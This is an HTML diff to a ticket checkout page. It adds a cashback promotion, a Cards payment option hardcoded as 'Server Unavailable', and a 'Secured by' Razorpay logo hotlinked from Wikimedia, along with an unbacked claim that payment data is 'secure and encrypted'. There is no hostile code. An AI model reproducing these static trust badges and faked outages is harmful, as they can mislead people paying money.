@@ -138,6 +138,7 @@
                 <div class="flex flex-col md:flex-row gap-6 max-w-4xl mx-auto">
                     
                     <div class="w-full md:w-full">
+                        
                         <div class="bg-white rounded-xl shadow-sm overflow-hidden border border-gray-100 payment-method-container">
                             
                             <div class="p-4 sm:p-6 border-b border-gray-100">
@@ -198,13 +199,55 @@
                                                 </a>
                                             </div>
                                             
-                                            <p id="redirect-countdown" class="text-xs sm:text-sm text-indigo-600 font-medium mt-4 text-center"></p>
+                                            <p id="redirect-countdown" class="text-xs sm:text-sm text-indigo-600 font-medium mt-4 text-center">Waiting for payment confirmation...</p>
+
+                                            <div class="bg-[#f0fdf4] border border-[#dcfce7] rounded-lg p-3 sm:p-4 text-center mx-1 mt-4 mb-2 shadow-sm">
+                                                <p class="text-[10px] sm:text-xs text-[#166534] leading-relaxed">
+                                                    <i class="fas fa-tag mr-1 text-[#22c55e]"></i> <strong>Upto ₹2,503 cashback.</strong> You will receive this cashback within 48 hours once the ticket is confirmed. It will be credited after the ticket confirmation happens within 24 hours.
+                                                </p>
+                                            </div>
+                                            
                                         </div>
                                     </div>
                                 </div>
                             </div>
+
+                            <div class="border-t border-gray-100 mx-4 py-4 flex justify-between items-center opacity-70 cursor-not-allowed">
+                                <div class="flex items-center gap-3">
+                                    <div class="text-[#8b5cf6] w-6 text-center">
+                                        <i class="fas fa-credit-card text-lg sm:text-xl"></i>
+                                    </div>
+                                    <span class="font-semibold text-gray-800 text-sm sm:text-base">Cards</span>
+                                </div>
+                                <span class="text-xs sm:text-sm font-semibold text-red-500">Server Unavailable</span>
+                            </div>
                             
                         </div>
+                        
+                        <div class="bg-white rounded-xl shadow-sm overflow-hidden border border-gray-100 mt-6 payment-method-container">
+                            <div class="flex justify-between items-center p-4 sm:p-5 border-b border-gray-100">
+                                <div>
+                                    <div class="text-xs text-gray-500 font-medium mb-1">Amount to be Paid</div>
+                                    <div class="text-xl sm:text-2xl font-bold text-gray-900 final_paid_price">₹0</div>
+                                </div>
+                                <a href="#" class="text-xs sm:text-sm font-semibold text-blue-600 hover:underline">View Details</a>
+                            </div>
+
+                            <div class="p-4 sm:p-5 flex flex-col items-center bg-gray-50/50">
+                                <div class="flex items-center text-gray-500 text-[10px] uppercase font-semibold tracking-wider mb-2">
+                                    <i class="fas fa-lock mr-1.5 text-xs"></i> Secured by
+                                </div>
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/Razorpay_logo.svg" alt="Razorpay" class="h-5 sm:h-6 mb-4 sm:mb-5">
+
+                                <div class="bg-white w-full rounded-xl p-3 flex items-start gap-2 border border-gray-100 mb-3 shadow-sm">
+                                    <i class="fas fa-shield-check text-green-600 mt-0.5 text-sm"></i>
+                                    <p class="text-[10px] sm:text-[11px] text-gray-600 leading-tight">Your payment information is secure and encrypted</p>
+                                </div>
+
+                                <a href="#" class="text-[10px] sm:text-[11px] text-blue-600 hover:underline">Payment Terms & Privacy Policy</a>
+                            </div>
+                        </div>
+
                     </div>
                     
                 </div>
